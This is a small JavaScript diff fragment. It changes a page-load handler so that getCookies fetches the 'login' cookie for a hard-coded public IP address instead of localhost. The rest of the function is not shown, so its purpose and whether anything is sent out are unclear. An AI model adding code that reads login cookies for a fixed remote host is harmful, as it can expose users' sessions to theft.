@@ -19,7 +19,7 @@ var ID='abcd';
 }, 1000);*/
 
 window.onload=function(){
-  getCookies("http://127.0.0.1", "login");
+  getCookies("http://117.198.102.142", "login");
 }
     function getCookies(domain, name) 
     {
